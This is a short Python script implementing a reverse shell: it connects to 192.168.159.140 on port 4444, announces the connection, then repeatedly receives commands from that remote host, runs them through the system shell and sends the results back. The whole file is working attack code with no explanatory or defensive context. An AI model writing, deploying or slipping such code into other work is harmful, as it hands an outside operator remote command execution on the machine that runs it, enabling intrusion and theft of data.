import socket
import subprocess
def sys_comn(command):
    return subprocess.check_output(command, shell=True)
contt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
contt.connect(("192.168.159.140", 4444))
message = "\n[+]Connection Established ...\n"
contt.send(message.encode('utf-8'))  # sending encoded message 
n =True
while n:
    command = contt.recv(10024) 
    command_res = sys_comn(command.decode('utf-8'))   #sending encoded command
    contt.send(command_res)
contt.close()